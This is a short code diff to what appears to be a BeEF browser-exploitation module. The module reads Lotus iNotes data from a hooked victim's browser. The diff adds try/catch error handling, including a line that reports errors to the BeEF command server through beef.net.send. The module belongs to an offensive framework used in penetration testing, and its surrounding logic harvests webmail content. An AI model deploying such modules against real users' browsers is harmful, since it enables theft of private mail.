@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2022 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2025Wade Alcorn wade@bindshell.net
 //
 // Licensed under the Apache License, Version 2.0 (the "License");
 // you may not use this file except in compliance with the License.
@@ -20,6 +20,8 @@ beef.execute(function() {
 	var currentURL = document.URL;
 	var rx = /(.*\.nsf)/g;
 	var arr = rx.exec(currentURL);
+
+try {
 	var notesURL = arr[1];
 	
 	var xhr = new XMLHttpRequest();
@@ -30,6 +32,11 @@ beef.execute(function() {
 		}
 	}
 	xhr.send(null);
+} catch(e) {
+	beef.debug("Error: " + e);
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Read iNotes Error: "+e);
+}
+
 });
 
 
